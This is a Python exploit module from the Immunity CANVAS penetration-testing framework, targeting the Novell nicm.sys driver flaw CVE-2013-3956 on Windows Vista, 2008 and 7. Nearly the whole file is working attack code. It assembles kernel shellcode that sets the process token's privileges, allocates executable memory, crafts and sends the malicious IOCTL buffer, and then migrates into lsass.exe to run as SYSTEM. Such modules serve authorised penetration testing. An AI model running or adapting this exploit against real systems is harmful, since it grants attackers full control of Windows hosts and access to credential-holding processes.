
#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")

import struct
from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME                           = "nicm.sys Privilege Escalation"
DESCRIPTION                    = "Novell nicm.sys Local Privilege Escalation Attack"
DOCUMENTATION                  = {}
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2013-3956"
DOCUMENTATION["CVE Url"]       = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3956"
DOCUMENTATION['CVSS']          = ""
DOCUMENTATION["CVS URL"]       = ""
DOCUMENTATION["Date public"]   = "05/22/2013"
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Windows']]
PROPERTY['VERSION']            = ['Vista', '2008', '7']

DOCUMENTATION['Notes']         = """

The IOCTL handler for the nicm.sys driver in Novell Client IR5 does not
validate pointers from usermode buffers. When passing in the IOCTL 0x143B6B
an attacker can supply a function pointer that lives in usermode resulting in
a privilege escalation.

The original 0-day was posted to Pastebin here: http://pastebin.com/GB4iiEwR

"""

TODO                           = """
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                   = NAME
        self.result                 = 0
        self.device_name            = "\\\\.\\nicm"
        self.ioctl_code             = 0x143B6B
        self.ioctl_buf_addr         = 0x0
        self.ioctl_buf_len          = 0
        self.ioctl_buf              = ""
        self.minor_version          = 0
        self.major_version          = 0
        self.x64                    = 0

    def create_shellcode(self):
        token_address = self.node.shell.get_process_token_ring0_address()
        self.log("Process Ring0 Token Address: 0x%08x" % token_address)

        # offset to SePrivileges
        token_address = token_address + 0x48

        if self.x64:
            asm = """
            push %r10
            movq $0xTOKENADDRESS, %r10
            movl $0xFFFFFFFF,(%r10)
            pop %r10
            ret
            """
        else:
            asm = """
            push %ebx
            movl $0xTOKENADDRESS, %ebx
            mov $0xFFFFFFFF, (%ebx)
            pop %ebx
            ret $0x8
            """

        asm = asm.replace("TOKENADDRESS", "%08x" % token_address)
        if self.x64:
            arch = 'x64'
        else:
            arch = 'x86'

        shellcode = mosdef.assemble(asm,arch)
        return shellcode

    def allocate_rwx_buffer(self):
        if self.x64:
            code = """
            #import "local", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
            #import "local", "sendlonglong" as "sendlonglong"

            void main()
            {
                long long address;
                address = VirtualAlloc(0, 0x1000, 0x1000, 0x40);
                sendlonglong(address);
            }
            """
        else:
            code = """
            #import "remote", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
            #import "local",  "sendint" as "sendint"

            void main()
            {
                int address;
                address = VirtualAlloc(0,0x1000,0x1000,0x40);
                sendint(address);
            }
            """

        vars = {}

        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(request)

        if self.x64:
            address = self.node.shell.readlonglong()
        else:
            address = self.node.shell.readint()

        self.node.shell.leave()
        return address

    def memcpy(self, dest, data):
        vars = {}
        vars["dest"] = dest

        code="""
        //start of code
        #import "local", "readintfromself" as "readintfromself"
        #import "local", "readdatafromself" as "readdatafromself"

        """
        if self.x64:
            code += """
            #import "long long", "dest" as "dest"
            """
        else:
            code += """
            #import "int", "dest" as "dest"
            """

        code += """

        void main()
        {  int size;

           size = readintfromself();
           readdatafromself(dest, size);
        }
        """

        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(request)

        self.node.shell.sendint(len(data))
        self.node.shell.writebuf(data)

        self.node.shell.leave()

    # Test to make sure the driver is accessible
    def test(self):
        if self.node.nodetype == "win64Node":
            self.x64 = True
            self.log("Running on 64-bit.")
        elif self.node.nodetype == "win32Node":
            if self.node.shell.has_wow_64 and self.node.shell.is_wow_64:
                self.log('This module does not currently support WoW64. Aborting.')
                return 0
            self.log("Running on 32-bit.")
        else:
            self.log('This module does not support node type: %s' % self.node.nodetype)
            return 0

        # Check our Windows version is >= Vista
        ret, os_version = self.node.shell.GetVersionEx()

        if not ret:
            self.log("Failed to determine OS version. Exiting.")
            return 0
        else:
            if os_version['Major Version'] < 6:
                self.log("Exploit only supports Windows 7 and up.")
                return 0

        self.major_version = os_version["Major Version"]
        self.minor_version = os_version["Minor Version"]

        # CreateFile* constants
        GENERIC_READ  = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 0x3

        self.h_driver_device = self.node.shell.CreateFile(self.device_name,GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)

        if self.h_driver_device <= 0:
            self.log("ncim.sys Driver Not Available. Exiting. Handle: 0x%08x" % self.h_driver_device)
            return 0
        else:
            self.log("ncim.sys Driver Available.")
            self.log("Handle: 0x%08x" % self.h_driver_device)

        return 1

    def test_lsass_access(self):
        # test that we even need to use an exploit
        process_list = self.node.shell.processlist()

        for process in process_list:
            if process["exe"] == "lsass.exe":
                lsass_pid = process["pid"]
                self.log("Found LSASS.exe PID: %d" % lsass_pid)
                break

        # try to get a handle to lsass
        h_lsass = self.node.shell.openprocess(lsass_pid)

        if h_lsass:
            self.log("Handle opened to LSASS successfully!")
            ret = 1
        else:
            self.log("Not enough privileges to access LSASS.")
            ret = 0

        self.node.shell.CloseHandle(h_lsass)

        return ret

    def run_attack(self,node):
        self.node = node

        # test for the driver
        ret = self.test()

        if not ret:
            return ret

        # build our privilege enabling shellcode
        shellcode = self.create_shellcode()
        shellcode_address = self.allocate_rwx_buffer()

        if not shellcode_address:
            self.log("Failed to allocate buffer for shellcode.")
            return 0

        self.memcpy(shellcode_address, shellcode)

        p_shellcode_address = self.allocate_rwx_buffer()

        if not p_shellcode_address:
            self.log("Failed to allocated buffer to point to shellcode.")
            return 0

        if self.x64:
            self.memcpy(p_shellcode_address, struct.pack("<Q", shellcode_address))
        else:
            self.memcpy(p_shellcode_address, struct.pack("<L", shellcode_address))


        p_buffer = self.allocate_rwx_buffer()

        if not p_buffer:
            self.log("Failed to allocate final buffer.")
            return 0

        if self.x64:
            self.memcpy(p_buffer, struct.pack("<Q", p_shellcode_address - 0x18))
        else:
            self.memcpy(p_buffer, struct.pack("<L", p_shellcode_address - 0xC))

        rw_address = self.allocate_rwx_buffer()

        if self.x64:
            in_buffer = ""
            in_buffer += struct.pack("<Q", p_buffer)
            in_buffer += "AAAA" * 6
            in_buffer += struct.pack("<Q", rw_address)
        else:
            in_buffer = ""
            in_buffer += struct.pack("<L", p_buffer)
            in_buffer += "AAAA"
            in_buffer += struct.pack("<L", rw_address)
            in_buffer += "BBBB"
            in_buffer += struct.pack("<L", rw_address)


        self.log("Firing IOCTL.")
        ret = self.node.shell.DeviceIoControlAddress(self.h_driver_device, self.ioctl_code, in_buffer,len(in_buffer))
        self.log("IOCTL sent")

        ret = self.test_lsass_access()

        if ret:
            self.log("Successful privilege escalation! Migrating to lsass.exe now.")

            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            migrate.argsDict['pid'] = 'lsass.exe'
            ret = migrate.run()

            if not ret:
                self.log("Couldn't migrate, aborting..")
                ret = 0
            else:
                self.log("Exploit succeeded. Now living in lsass.exe")
                ret = 1

        else:
            # failed to get a handle to lsass.exe our exploit failed
            ret = 0

        return ret

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                self.log("Successfully migrated to LSASS. We are now SYSTEM.")
                success=1
        return success

if __name__=='__main__':
    print 'This Windows local module is meant to be run only within CANVAS'
